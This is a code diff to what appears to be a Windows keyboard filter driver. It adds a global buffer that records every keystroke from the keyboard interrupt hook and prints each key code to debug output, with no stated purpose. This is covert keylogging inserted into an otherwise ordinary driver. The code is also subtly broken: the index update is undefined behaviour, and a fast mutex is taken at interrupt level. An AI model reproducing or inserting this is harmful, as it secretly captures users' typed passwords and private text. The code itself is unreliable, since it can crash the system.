@@ -45,6 +45,26 @@ Environment:
 #pragma alloc_text (PAGE, KbFilter_EvtIoInternalDeviceControl)
 #endif
 
+#define MAX_KEY_BUFFER 256
+
+UCHAR KeyBuffer[MAX_KEY_BUFFER];
+ULONG KeyBufferIndex = 0;
+FAST_MUTEX KeyBufferMutex;
+
+VOID InitializeKeyBuffer() {
+    RtlZeroMemory(KeyBuffer, sizeof(KeyBuffer));
+    KeyBufferIndex = 0;
+    ExInitializeFastMutex(&KeyBufferMutex);
+}
+
+VOID AddKeyToBuffer(UCHAR key) {
+    ExAcquireFastMutex(&KeyBufferMutex);
+    DebugPrint(("Key pressed: 0x%X\n", key));
+    KeyBuffer[KeyBufferIndex] = key;
+    KeyBufferIndex = ++KeyBufferIndex % MAX_KEY_BUFFER;
+    ExReleaseFastMutex(&KeyBufferMutex);
+}
+
 ULONG InstanceNo = 0;
 
 NTSTATUS
@@ -105,6 +125,8 @@ Return Value:
     if (!NT_SUCCESS(status)) {
         DebugPrint(("WdfDriverCreate failed with status 0x%x\n", status));
     }
+
+    InitializeKeyBuffer();
 
     return status;
 }
@@ -756,6 +778,10 @@ Return Value:
         if (!retVal || !(*ContinueProcessing)) {
             return retVal;
         }
+    }
+
+    if (*DataByte != 0) {
+        AddKeyToBuffer(*DataByte);
     }
 
     *ContinueProcessing = TRUE;
